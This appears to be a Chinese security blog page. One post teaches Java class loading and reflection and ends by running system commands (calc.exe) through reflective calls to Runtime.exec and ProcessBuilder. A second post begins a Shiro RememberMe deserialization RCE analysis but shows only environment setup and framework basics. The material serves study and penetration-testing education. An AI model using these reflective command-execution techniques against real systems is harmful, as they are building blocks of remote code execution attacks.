<li><p>从JAR包中加载CLASS文件</p>
</li>
<li><p>通过网络加载CLASS文件</p>
</li>
<li><p>通过JAVA源文件动态编译加载执行</p>
<p>JVM自带的类加载器通常分为如下三种：</p>
</li>
</ul>
<p><strong>BootStrap ClassLoader</strong> ：启动类加载器，是顶层加载器。</p>
<p><strong>Extension ClassLoader</strong>：称之为扩展类加载器，负责加载Java的扩展类库，默认加载$JAVA_HOME中jre/lib/*.jar 或 -Djava.ext.dirs指定目录下的jar包。</p>
<p><strong>System ClassLoader</strong>：称之为系统类加载器，负责加载应用程序classpath目录下所有jar和class文件。</p>
<p>​    那么者三种类型的加载器之间的继承关系是怎样的？可以写个代码简单测试一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public class ClassLoaderTest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ClassLoader loader &#x3D; Thread.currentThread().getContextClassLoader();</span><br><span class="line">        System.out.println(loader);</span><br><span class="line">        System.out.println(loader.getParent());</span><br><span class="line">        System.out.println(loader.getParent().getParent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202163758388.png" alt="image-20201202163758388"></p>
<p>​        通过上面的结果，我们可以看出    APPClassLoader的父类型是ExtClassLoader，但是ExtClassLoader的父类型空，因为BootStrap ClassLoader是用C++写的。</p>
<h5 id="JVM的类加载机制"><a href="#JVM的类加载机制" class="headerlink" title="JVM的类加载机制"></a><strong>JVM的类加载机制</strong></h5><p>​        <strong>全盘负责</strong>，当一个类加载器负责加载某个Class时，该Class所依赖的和引用的其他Class也将由该类加载器负责载入，除非显示使用另外一个类加载器来载入</p>
<p>​        <strong>父类委托</strong>，先让父类加载器试图加载该类，只有在父类加载器无法加载该类时才尝试从自己的类路径中加载该类</p>
<p>​        <strong>缓存机制</strong>，缓存机制将会保证所有加载过的Class都会被缓存，当程序中需要使用某个Class时，类加载器先从缓存区寻找该Class，只有缓存区不存在，系统才会读取该类对应的二进制数据，并将其转换成Class对象，存入缓存区。这就是为什么修改了Class后，必须重启JVM，程序的修改才会生效</p>
<h5 id="类加载方式"><a href="#类加载方式" class="headerlink" title="类加载方式"></a>类加载方式</h5><p>​        类的加载方式有三种：</p>
<ul>
<li><p>命令行启动JAVA程序时由JVM加载</p>
</li>
<li><p>通过Class.forName()方法加载</p>
</li>
<li><p>通过ClassLoader.loadClass()方法动态加载</p>
<p>我们可以写个demo测试一下这几种加载方式有何不不同。</p>
<p>首先测试loadClass方式，我们在loadClass处下断点，查看其具体的操作。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public class ClassLoaderTest&#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException &#123;</span><br><span class="line">        ClassLoader loader &#x3D; test666.class.getClassLoader();</span><br><span class="line">        System.out.println(loader);</span><br><span class="line">        &#x2F;&#x2F;使用ClassLoader.loadClass()来加载类，不会执行初始化块</span><br><span class="line">        loader.loadClass(&quot;test666&quot;);</span><br><span class="line">        &#x2F;&#x2F;使用Class.forName()来加载类，默认会执行初始化块</span><br><span class="line">        &#x2F;&#x2F;Class.forName(&quot;Test2&quot;);</span><br><span class="line">        &#x2F;&#x2F;使用Class.forName()来加载类，并指定ClassLoader，初始化时不执行静态块</span><br><span class="line">        &#x2F;&#x2F;Class.forName(&quot;Test2&quot;, false, loader);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        在loadClass中，通过调用findLoadedClass来获取Class对象，再将Class对象返回，这个过程中并不会去调用获取到的Class类的static静态代码块的内容，也不会调用其对应的构造方法。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202170613299.png" alt="image-20201202170613299"></p>
<p>​        当我们通过获取的Class对象再调用newInstance方法时，则会先调用static静态代码块，再去调用构造方法。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202171313057.png" alt="image-20201202171313057"></p>
<p>​        newInstance调用时，先调用静态代码块，如下所示：</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202171335684.png" alt="image-20201202171335684"></p>
<p>​        再调用构造函数，如下图所示:</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202171418171.png" alt="image-20201202171418171"></p>
<p>​        我们再测试一下Class.forName(“test666”)是如何工作的，由于forName内部的实现都是native层的，我这里跟踪不到，就不具体分析了，我们只了解一下它的执行结果。在<strong>调用forName后，会自动调用对应类的静态代码块，但不会执行构造方法。</strong>如果需要调用构造方法，则也需要调用newInstance方法。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202172214675.png" alt="image-20201202172214675"></p>
<p>​        我们之前的测试中加载的类是由无参数的构造方法的，如果没有无参数的构造方法，那么我们在调用newInstance的过程中，是否会去调用有参的构造方法。<strong>当我将加载类的构造方法的无参构造方法去掉时，调用newInstance将不会执行任何操作。</strong></p>
<p>​        关于类的加载先了解这么多，我们接下来主要了解下当获取到Class对象后如何通过反射调用来获取类的信息。</p>
<h4 id="反射调用获取类的信息"><a href="#反射调用获取类的信息" class="headerlink" title="反射调用获取类的信息"></a>反射调用获取类的信息</h4><p>​        通过之前的学习我们了解了如何获取Class对象，获取了这个对象后我们如何获取类的其他信息？我们接下来将一起学习这部分的内容。</p>
<h5 id="获取构造器"><a href="#获取构造器" class="headerlink" title="获取构造器"></a>获取构造器</h5><p>​        之前我们直接通过获取到的Class调用newInstance方法，只会调用访问权限为Public的无参构造器，如果我们想获取其他构造器该怎么办？JAVA为我们提供了下面几种获取构造器的方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;T&gt; getConstructor(Class&lt;?&gt; parameterTypes)  获取带指定参数类型的public构造器</span><br><span class="line">Constructor&lt;?&gt;[] getConstructors()  返回这个类的所有public类型的构造器</span><br><span class="line">Constructor&lt;T&gt; getDeclaredConstructor(Class&lt;?&gt; parameterTypes)  获取带指定参数类型的无视访问权限的构造器</span><br><span class="line">Constructor&lt;?&gt;[] getDeclaredConstructor()  获取Class对象的所有构造器无视访问权限的构造器</span><br></pre></td></tr></table></figure>

<p>​        我这里做了一个测试，我们尝试获取public访问权限的带参构造器,代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">Constructor con&#x3D;test666.getConstructor(String.class);</span><br><span class="line">Object obj &#x3D; con.newInstance(&quot;test666&quot;);</span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure>

<p>​        成功访问到对应的带参构造器，如下图所示：</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202180512409.png" alt="image-20201202180512409"></p>
<p>​        尝试访问priivate 权限的带参构造器，代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">Constructor con&#x3D;test666.getDeclaredConstructor(String.class);</span><br><span class="line">Object obj &#x3D; con.newInstance(&quot;test666&quot;);</span><br><span class="line">System.out.println(obj);</span><br></pre></td></tr></table></figure>

<p>​        经过测试，也仅仅只能getDeclaredConstructor获取private类型的构造器，通过newInstance来调用private的构造方法还是会报错。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202181052265.png" alt="image-20201202181052265"></p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202181100882.png" alt="image-20201202181100882"></p>
<h5 id="获取方法"><a href="#获取方法" class="headerlink" title="获取方法"></a>获取方法</h5><p>​        下面我们一起学习一下如何获取对应的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public Method getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes) &#x2F;&#x2F; 得到该类所有的方法无视方法的访问权限</span><br><span class="line">public Method getMethod(String name, Class&lt;?&gt;... parameterTypes) &#x2F;&#x2F; 得到指定类的public方法</span><br></pre></td></tr></table></figure>

<p>​        我们做一个测试,查看如何通过getMethod获取对应的方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">Method methods &#x3D;test666.getMethod(&quot;xxx&quot;,String.class);</span><br><span class="line">System.out.println(methods);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202223349526.png" alt="image-20201202223349526"></p>
<p>​        上面是当我们反射调用的test666类存在xxx方法时调用的结果，如果test666类不存在我们要调用的xxx方法，而test666的父类test888存在我们要调用的方法，那么我们通过getMethod是否能获取test888对应的方法呢？</p>
<p>​        答案是<strong>当前通过反射调用getMethod的类如果没有我们想要调用的方法，则会通过反射调用父类对应的方法</strong>。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202223717517.png" alt="image-20201202223717517"></p>
<p>​    当我们将需要反射调用的方法改为private的访问权限，通过getDeclaredMethod仍然可以找到对应的方法。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201202224039107.png" alt="image-20201202224039107"></p>
<h5 id="获取变量"><a href="#获取变量" class="headerlink" title="获取变量"></a>获取变量</h5><p>​        获取变量的信息可以通过下面的两个方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getFiled：访问公有的成员变量</span><br><span class="line">getDeclaredField：所有已声明的成员变量，但不能得到其父类的成员变量</span><br></pre></td></tr></table></figure>

<p>​        为了方便大家理解，我们同样写一个DEMO进行测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">Object o&#x3D;test666.newInstance();</span><br><span class="line">Field field &#x3D;test666.getField(&quot;cmd&quot;);</span><br><span class="line">System.out.println(field.get(o));</span><br></pre></td></tr></table></figure>

<p>​        在test666这个类中，有一个cmd参数，我们测试能否通过反射调用来获取cmd这个变量。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203092022639.png" alt="image-20201203092022639"></p>
<p>​        我们打开debug进行调试，可以看到当调用newInstance来创建test666这个类的实例时，会对变量进行初始化。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203111226737.png" alt="image-20201203111226737"></p>
<p>​    通过getFiled获取到cmd变量，最后通过filed.get获取实例化对象o对应的变量cmd的内容进行输出。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203111441672.png" alt="image-20201203111441672"></p>
<p>​        但是使用getFiled获取不到函数中定义的变量，即使是构造函数中的变量也无法获得，当我们尝试获取非public权限的变量，会获取失败，如下图所示：</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203112359310.png" alt="image-20201203112359310"></p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203112439206.png" alt="image-20201203112439206"></p>
<p>​        我们将test666这个类中的变量cmd访问权限修改为private，setAccessible修改访问权限后，通过反射调用获取变量。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203113340739.png" alt="image-20201203113340739"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">Object o&#x3D;test666.newInstance();</span><br><span class="line">Field field &#x3D;test666.getDeclaredField(&quot;cmd&quot;);</span><br><span class="line">field.setAccessible(true);</span><br><span class="line">System.out.println(field.get(o));</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203113529161.png" alt="image-20201203113529161"></p>
<h5 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h5><p>​        获取到方法后，我们可以通过invoke来调用方法，并传递参数，测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">  Object o&#x3D;test666.newInstance();</span><br><span class="line">  Method method &#x3D; test666.getMethod(&quot;test123&quot;, String.class);</span><br><span class="line">  Object result &#x3D; method.invoke(o,&quot;hello world&quot;);</span><br><span class="line">  System.out.println(result);</span><br></pre></td></tr></table></figure>

<p>​        在test666类中的test123方法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public String test123(String aaa)&#123;</span><br><span class="line">    String x&#x3D;aaa;</span><br><span class="line">    return x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        通过invoke反射调用，执行test123方法。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203114541607.png" alt="image-20201203114541607"></p>
<p>​        如果是private的方法，我们也可以通过getDeclaredMethod来获取并进行调用，不过在调用之前需要调用setAccessible方法设置属性。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203120405405.png" alt="image-20201203120405405"></p>
<h5 id="修改私有变量"><a href="#修改私有变量" class="headerlink" title="修改私有变量"></a>修改私有变量</h5><p>​        我们之前了解了一些获取变量的方法，那么这些变量我们该如何进行修改呢？下面是我的测试代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;test666&quot;);</span><br><span class="line">      Object o&#x3D;test666.newInstance();</span><br><span class="line">      Field privateField &#x3D; test666.getDeclaredField(&quot;cmd&quot;);</span><br><span class="line">      privateField.setAccessible(true);</span><br><span class="line">      privateField.set(o, &quot;hello&quot;);</span><br><span class="line">      System.out.println(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure>

<p>​        test666类中cmd的值是xxx</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203132448457.png" alt="image-20201203132448457"></p>
<p>​        运行程序后，cmd变量的值成功被修改。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203132532134.png" alt="image-20201203132532134"></p>
<h4 id="反射调用执行系统命令"><a href="#反射调用执行系统命令" class="headerlink" title="反射调用执行系统命令"></a>反射调用执行系统命令</h4><p>​        我们平时遇到的JAVA命令执行，大多数是通过反射调用Process.builder执行系统命令而很少使用Runtime.exec来执行命令，这是为什么？能否通过Runtime.exec来执行命令呢？</p>
<h5 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a>Runtime</h5><p>​        首先测试一下Runtime能否通过反射调用exec方法来进行命令执行，测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">Constructor con&#x3D;clazz.getDeclaredConstructor();</span><br><span class="line">Object o&#x3D; con.newInstance();</span><br><span class="line">Method methods &#x3D;clazz.getDeclaredMethod(&quot;exec&quot;,String.class);</span><br><span class="line">methods.invoke(o,&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>

<p>​        我在测试过程中发现，当执行到newInstance会报错</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203142145567.png" alt="image-20201203142145567"></p>
<p>​        我们查看runtime的源码，可以看到Runtime只有一个private类型的构造函数，因此直接调用这个构造函数会因为访问权限不足而报错。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203142209061.png" alt="image-20201203142209061"></p>
<p>​        但是结合我们之前讲过的方法，我们可以使用setAccessible来设置访问权限,我尝试修改这个构造方法的访问权限，最终可以通过反射来调用Runtime.exec来执行命令。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203142503837.png" alt="image-20201203142503837"></p>
<h5 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h5><p>​        我们再试试通过ProcessBuilder来执行系统命令,测试代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class test666&#x3D;Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">Constructor con &#x3D; test666.getConstructor(List.class);</span><br><span class="line">Object o&#x3D;con.newInstance(Arrays.asList(&quot;calc.exe&quot;));</span><br><span class="line">Method method &#x3D; test666.getMethod(&quot;start&quot;);</span><br><span class="line">Object result &#x3D; method.invoke(o);</span><br><span class="line">System.out.println(result);</span><br></pre></td></tr></table></figure>

<p>​        这里需要注意，由于ProcessBuilder没有无参构造器，所以在调用构造方法的时候需要传递需要的参数类型，创建实例的时候也需要传入参数，但是调用start方法的时候无需传入参数，由于ProcessBuilder的构造方法是public类型，因此无需设置访问权限。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203144932128.png" alt="image-20201203144932128"></p>
<p>​        当然ProcessBuilder的构造方法不止这一个，还有一个重载的方法</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203145832898.png" alt="image-20201203145832898"></p>
<p>​        下面我们学习一下如何通过反射调用这个方法，这里面使用了的参数是变长参数，对于边长参数，我们也可以当数组来处理，如下所示：</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203152347974.png" alt="image-20201203152347974"></p>
<p>​        所以我们获取这个构造方法时可以这样<code>getConstructor(String[].class)</code> </p>
<p>当我们通过<code>newInstance</code>来创建实例时，由于newInstance这个函数也是可变参数，所以可以使用两层数组来引用<code>new String[][]calc.exe</code>。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203152629453.png" alt="image-20201203152629453"></p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203152723799.png" alt="image-20201203152723799"></p>
<p>​        由于newInstance接收的可变参数是Object类型，因此可以通过<code>(Object)new String[]{&quot;calc.exe&quot;}</code>来创建实例。</p>
<p><img src="/2020/12/02/JAVA%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0/image-20201203153631825.png" alt="image-20201203153631825"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">shiro rce漏洞分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-11-28 22:07:45" itemprop="dateCreated datePublished" datetime="2020-11-28T22:07:45+08:00">2020-11-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-12-24 10:04:49" itemprop="dateModified" datetime="2020-12-24T10:04:49+08:00">2020-12-24</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞分析</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在最近这几年，我们在渗透的过程中经常会用到shiro的rce漏洞来打点，直到目前为止还经常会在一些项目或者HW中也会经常遇到shrio的rce，因此了解shiro的RememberMe反序列化导致的命令执行漏洞的原理是至关重要的，在本次分享中，我将和大家一起学习shiro RememberMe反序列化漏洞。</span><br></pre></td></tr></table></figure>

<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>​    我这里选择网上已经有人搭建好的漏洞环境来搭建环境<code>https://github.com/potats0/ShiroDemo</code>，下载好项目以后使用IDEA导入pom.xml文件，由于我这里使用的MAVEN是阿里云镜像，我使用shiro-core为1.2.4时提示我找不到包，因此我这里使用的是1.2.2版本。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201128221450755.png" alt="image-20201128221450755"></p>
<p>​    需要的包导入后，找到App.java文件，通过调试来运行。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201128221552395.png" alt="image-20201128221552395"></p>
<p>​    运行成功后界面如下：</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201128221658967.png" alt="image-20201128221658967"></p>
<h3 id="Shiro基本知识"><a href="#Shiro基本知识" class="headerlink" title="Shiro基本知识"></a>Shiro基本知识</h3><p>​    我们知道，shiro是一款用来进行权限认证和权限管理的框架，可以帮我们完成认证、授权、加密、会话管理、与Web集成、缓存等功能。</p>
<p>​    下面我结合着这个漏洞环境的代码带大家一起学习一下shiro的基本知识。</p>
<p>​    在这个项目的源码文件中，主要包含了4个文件，APP.java内容为启动springboot的内容，这里不做解释了，看下其他文件的内容，首先是MainRealm.java，在介绍这个文件的内容前，我们先了解几个基本的概念。</p>
<p>​    我们知道，shiro框架的一个主要的功能是用来做身份认证的，在shiro中，主要通过principals （身份）和 credentials（证明）一起来验证用户的身份。</p>
<h4 id="principals"><a href="#principals" class="headerlink" title="principals"></a><strong>principals</strong></h4><p>​    指用户身份的标识，可以是用户的用户名，手机号等等，但需要确保其唯一性。</p>
<h4 id="credentials"><a href="#credentials" class="headerlink" title="credentials"></a><strong>credentials</strong></h4><p>​    凭证，一般来说就是密码。</p>
<h4 id="Realm"><a href="#Realm" class="headerlink" title="Realm"></a><strong>Realm</strong></h4><p>​    域，shiro会从Realm中获取安全数据（用户，角色，权限），当SecurityManager要身份认证，需要从Realm中来确定用户身份以及用户可以访问的权限。</p>
<p>​    在shiro中，SecurityManager负责身份认证的逻辑，它会委托给Authenticator进行身份认证，Authenticator 会把相应的 token 传入 Realm，从 Realm 获取身份验证信息，如果没有返回 / 抛出异常表示身份验证失败了。此处可以配置多个 Realm，将按照相应的顺序及策略进行访问。</p>
<p><strong>AuthorizingRealm</strong></p>
<p>​    在shiro中，默认提供了一些Realm，他们的继承关系如下：</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.png" alt="img"> </p>
<p>​    CachingRealm是带缓存的Realm，里面包含了多个CacheManager属性，具体的缓存在其子类中进行实现。</p>
<p>​    AuthenticatingRealm是带认证的Realm,该类实现了认证的基本逻辑和缓存逻辑。</p>
<p>​    AuthorizingRealm主要用来鉴权和获取授权信息的Realm,该类实现了Authorizer，所以可以做鉴权。也实现了PermissionResolverAware，RolePermissionResolverAware因此可以对用户的访问权限做判断。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129131100239.png" alt="image-20201129131100239"></p>
<p>​    在shiro认证过程中，依赖AuthenticatingRealm的getAuthenticationInfo方法，getAuthenticationInfo会调用我们自定义的doGetAuthenticationInfo方法获取认证的结果。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129132011123.png" alt="image-20201129132011123"></p>
<p>​    在登录的时候需要将数据封装到<code>Shiro</code>的一个<code>token</code>中，执行shiro的<code>login()</code>方法，<code>Shiro</code>就会自动的调用<code>doGetAuthenticationInfo(AuthenticationToken token)</code>方法获取身份认证信息，在本次环境中，首先通过token.getPrincipal()方法获取username信息，通过authenticationToken.getCredentials()获取密码信息，对用户的用户名和密码进行判断，如果用户用户名为admin,密码为vulhub，认证成功则返回SimpleAuthenticationInfo对象,mainrealm.java的代码如下：</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129122749329.png" alt="image-20201129122749329"></p>
<h4 id="shiro拦截器"><a href="#shiro拦截器" class="headerlink" title="shiro拦截器"></a><strong>shiro拦截器</strong></h4><p>​    在shiro中使用了与 Servlet 一样的 Filter 接口进行扩展，shiro拦截器的基础类及其继承关系如下：</p>
<p><img src="https://wiki.jikexueyuan.com/project/shiro/images/14.png" alt="img"></p>
